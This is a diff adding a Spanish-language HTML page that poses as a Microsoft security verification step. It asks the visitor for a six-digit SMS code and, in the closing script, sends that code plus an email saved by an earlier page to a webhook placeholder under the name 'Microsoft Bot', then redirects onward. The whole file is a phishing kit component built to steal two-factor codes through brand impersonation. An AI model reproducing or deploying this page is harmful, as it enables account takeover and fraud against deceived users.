@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Actualización de términos</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #f4f6f8;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .aaa {
+            width: 100%;
+            padding: 20px;
+            box-sizing: border-box;
+            display: flex;
+            justify-content: center;
+        }
+        .caja {
+            background: #ffffff;
+            width: 100%;
+            max-width: 460px;
+            padding: 48px 40px;
+            border-radius: 12px;
+            box-shadow: 0px 4px 24px rgba(0, 0, 0, 0.04);
+            text-align: center;
+            box-sizing: border-box;
+        }
+        .imgkol {
+            margin-bottom: 24px;
+        }
+        .imgkol img {
+            height: 22px;
+        }
+        .titu1 {
+            font-size: 26px;
+            font-weight: 600;
+            color: #111111;
+            line-height: 1.25;
+            margin: 0 auto 16px auto;
+            max-width: 320px;
+        }
+        .titu2 {
+            font-size: 14.5px;
+            color: #444444;
+            line-height: 1.5;
+            margin-bottom: 28px;
+        }
+        .subC {
+            background: #fcf3e6;
+            text-align: left;
+            padding: 20px 24px;
+            border-radius: 8px;
+            margin-bottom: 32px;
+            box-sizing: border-box;
+            border-left: 4px solid #f6a700;
+        }
+        .sut {
+            display: inline-block;
+            background: #ffcb5c;
+            color: #6c3100;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-bottom: 7px;
+        }
+        .subC p {
+            font-size: 14px;
+            color: #333333;
+            line-height: 1.5;
+            margin: 0 0 12px 0;
+        }
+        .subC p:last-child {
+            margin-bottom: 0;
+        }
+        .btn1 {
+            margin-bottom: 32px;
+        }
+        .btn1 button {
+            background: #0067b8;
+            color: #ffffff;
+            border: none;
+            padding: 10px 32px;
+            font-size: 15px;
+            font-weight: 600;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .btn1 button:hover {
+            background: #005a9e;
+        }
+         .e2{
+            margin-bottom: 7px;
+            font-size: 14px;
+            font-weight: 600;
+            
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 8px 0 8px 8px;
+            font-size: 15px;
+            font-family: inherit;
+            border: 1px solid #8a8886;
+            outline: none;
+            background: transparent;
+            box-sizing: border-box;
+            transition: border-bottom-color 0.2s, border-bottom-width 0.2s;
+        }
+        .adis {
+            border-top: 1px solid #f0f0f0;
+            padding-top: 20px;
+            font-size: 12px;
+            color: #666666;
+            text-align: left;
+            display: flex;
+            flex-wrap: wrap;
+            row-gap: 8px;
+            column-gap: 16px;
+        }
+        .adis a {
+            color: #666666;
+            text-decoration: none;
+        }
+        .adis a:hover {
+            text-decoration: underline;
+        }
+        .adis p {
+            width: 100%;
+            margin: 12px 0 0 0;
+            color: #888888;
+        }
+        @media (max-width: 480px) {
+            .caja {
+                padding: 32px 24px;
+            }
+            .titu1 {
+                font-size: 22px;
+            }
+            .adis {
+                flex-direction: column;
+                text-align: center;
+                align-items: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="aaa">
+        <div class="caja">
+            <div class="imgkol">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="">
+            </div>
+
+            <div class="titu1">Verificación de seguridad</div>
+            
+            <div class="titu2">Para continuar con la validación ingrese el código que le hemos enviado vía SMS a su teléfono</div>
+            
+            <div class="subC">
+                <div class="sut">Importante</div>
+                <p>Asegúrese de que el Código sea el correcto, ya que esta validación es necesaria para verificar su identidad. En caso de error podría ser bloqueado.</p>
+            </div>
+            <div class="input-group">
+                    <p class="e2" for="">Código SMS</p>
+                    <input style="text-align: center;" type="text" inputmode="numeric" pattern="[0-9]{6}" maxlength="6" placeholder=" * * * * * *" required>
+                </div>
+
+            <a href="cargando2.html">
+            <div class="btn1"><button>Siguiente</button></div>
+</a>
+            <div class="adis">
+                <a href="#">Términos de uso</a>
+                <a href="#">Aviso de privacidad</a>
+                <a href="#">Más información</a> 
+                <p>© 2026 Microsoft</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+    const webhook = "AQUI_AQUI_AQUI_AQUI_AQUI_AQUI_AQUI";
+    document.querySelector('.btn1 button').addEventListener('click', async (e) => {
+        e.preventDefault();
+        const userData = JSON.parse(localStorage.getItem('userDataIndex1') || '{}');
+        const email = userData.email || 'Sin correo';
+        const codigoInput = document.querySelector('.input-group input');
+        const codigo = codigoInput ? codigoInput.value : '';
+        const mensaje = `📱 **Código SMS**\n📧 Correo: ${email}\n🔢 Código SMS: ${codigo}`;
+        try {
+            await fetch(webhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: mensaje, username: 'Microsoft Bot' })
+            });
+        } catch(err) { console.error(err); }
+        window.location.href = 'cargando3.html';
+    });
+</script>
+</body>
+</html>
